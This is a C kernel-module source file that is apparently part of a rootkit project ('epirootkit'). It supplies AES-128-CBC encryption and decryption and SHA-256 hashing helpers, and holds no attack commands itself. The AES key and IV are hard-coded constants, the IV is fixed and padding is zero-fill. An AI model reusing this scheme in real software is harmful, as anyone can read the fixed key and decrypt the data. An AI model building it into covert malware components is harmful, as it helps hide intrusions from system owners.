#include <crypto/hash.h>
#include <crypto/skcipher.h>
#include <linux/crypto.h>
#include <linux/err.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "epirootkit.h"

// AES encryption parameters
// Key must be 16 bytes (128 bits) for AES-128
// IV is used to initialize the cipher and must be 16 bytes as well
// msg for @__evann :
// 	It works, for more infos see: https://www.cryptopp.com/wiki/AES
#define AES_KEY "1234567890abcdef" // 16 bytes = 128 bits key
#define AES_IV "abcdef1234567890"
#define AES_BLOCK_SIZE 16

// Prototypes
int encrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len);
int decrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len);
int hash_string(const char *input, u8 *digest);
bool are_hash_equals(const u8 *h1, const u8 *h2);
void hash_to_str(const u8 *digest, char *output);

static int _crypt_buffer(bool encrypt, const char *in, size_t in_len, char **out, size_t *out_len) {
    struct crypto_skcipher *tfm;  // Cipher transformation handle
    struct skcipher_request *req; // Cipher request handle
    struct scatterlist sg;        // Scatterlist for input/output data
    char *buf;                    // Buffer to hold input data (padded if necessary)
    int ret = 0;                  // Return value
    char iv[AES_BLOCK_SIZE];      // Initialization vector

    // Round up input length to the nearest multiple of AES block size
    size_t padded_len = roundup(in_len, AES_BLOCK_SIZE);
    buf = kzalloc(padded_len, GFP_KERNEL);
    if (!buf)
        return -ENOMEM;

    memcpy(buf, in, in_len);            // Copy input data to the buffer
    memcpy(iv, AES_IV, AES_BLOCK_SIZE); // Copy IV

    // Allocate cipher transformation for AES in CBC mode
	// CBC (Cipher Block Chaining) mode is a block cipher mode that uses an initialization vector (IV)
	// again, see https://www.cryptopp.com/wiki/AES
    tfm = crypto_alloc_skcipher("cbc(aes)", 0, 0);
    if (IS_ERR(tfm)) {
        kfree(buf);
        return PTR_ERR(tfm);
    }

    // Allocate cipher request
    req = skcipher_request_alloc(tfm, GFP_KERNEL);
    if (!req) {
        crypto_free_skcipher(tfm);
        kfree(buf);
        return -ENOMEM;
    }

    // Set the encryption key
    if ((ret = crypto_skcipher_setkey(tfm, AES_KEY, 16)) != 0) {
        printk(KERN_ERR "setkey failed: %d\n", ret);
        goto out_free;
    }

    // Initialize scatterlist with the buffer
    sg_init_one(&sg, buf, padded_len);
    skcipher_request_set_crypt(req, &sg, &sg, padded_len, iv);

    // Perform encryption or decryption
    if (encrypt)
        ret = crypto_skcipher_encrypt(req);
    else
        ret = crypto_skcipher_decrypt(req);

    if (ret) {
        printk(KERN_ERR "%s failed: %d\n", encrypt ? "encrypt" : "decrypt", ret);
        goto out_free;
    }

    *out = buf;            // Set output buffer
    *out_len = padded_len; // Set output length

out_free:
    skcipher_request_free(req);
    crypto_free_skcipher(tfm);

    if (ret)
        kfree(buf);

    return ret;
}

/**
 * @brief Encrypts a buffer using AES-128 in CBC mode.
 *
 * @param in Input buffer to encrypt.
 * @param in_len Length of the input buffer.
 * @param out Pointer to the output buffer (allocated within the function).
 * @param out_len Pointer to the length of the output buffer.
 * @return 0 on success, negative error code on failure.
 */
int encrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len) {
    return _crypt_buffer(true, in, in_len, out, out_len);
}

/**
 * @brief Decrypts a buffer using AES-128 in CBC mode.
 *
 * @param in Input buffer to decrypt.
 * @param in_len Length of the input buffer.
 * @param out Pointer to the output buffer (allocated within the function).
 * @param out_len Pointer to the length of the output buffer.
 * @return 0 on success, negative error code on failure.
 */
int decrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len) {
    return _crypt_buffer(false, in, in_len, out, out_len);
}

/**
 * @brief Hashes a string using SHA-256.
 *
 * @param input Input string to hash.
 * @param digest Output buffer for the hash (must be at least SHA256_DIGEST_SIZE bytes).
 * @return 0 on success, negative error code on failure.
 */
int hash_string(const char *input, u8 *digest) {
    struct crypto_shash *tfm; // Hash transformation handle
    struct shash_desc *shash; // Hash descriptor
    char *desc_buffer;        // Buffer for hash descriptor
    int desc_size, ret;

    if (!input || !digest)
        return -EINVAL;

    // Allocate hash transformation for SHA-256
    tfm = crypto_alloc_shash("sha256", 0, 0);
    if (IS_ERR(tfm)) {
        pr_err("Erreur allocation tfm SHA-256\n");
        return PTR_ERR(tfm);
    }

    // Allocate memory for hash descriptor
    desc_size = sizeof(struct shash_desc) + crypto_shash_descsize(tfm);
    desc_buffer = kmalloc(desc_size, GFP_KERNEL);
    if (!desc_buffer) {
        crypto_free_shash(tfm);
        return -ENOMEM;
    }

    shash = (struct shash_desc *)desc_buffer;
    shash->tfm = tfm;

    // Compute the hash
    ret = crypto_shash_digest(shash, input, strlen(input), digest);

    kfree(desc_buffer);     // Free descriptor buffer
    crypto_free_shash(tfm); // Free hash transformation

    return ret;
}

/**
 * @brief Compares two SHA-256 hashes for equality.
 *
 * @param h1 First hash to compare.
 * @param h2 Second hash to compare.
 * @return true if the hashes are equal, false otherwise.
 */
bool are_hash_equals(const u8 *h1, const u8 *h2) {
    if (!h1 || !h2)
        return false;

    return (memcmp(h1, h2, SHA256_DIGEST_SIZE) == 0) ? true : false;
}

/**
 * @brief Converts a SHA-256 hash to a hexadecimal string.
 *
 * @param digest Input hash to convert.
 * @param output Output buffer for the hexadecimal string (must be at least SHA256_DIGEST_SIZE * 2 + 1 bytes).
 */
void hash_to_str(const u8 *digest, char *output) {
    int i;

    if (!digest || !output) {
        pr_err("hash_to_str: digest or output NULL\n");
        return;
    }

    // Convert each byte of the hash to a 2-character hexadecimal representation
    for (i = 0; i < SHA256_DIGEST_SIZE; i++)
        sprintf(output + (i * 2), "%02x", digest[i]);
    output[SHA256_DIGEST_SIZE * 2] = '\0'; // Null-terminate the string
}
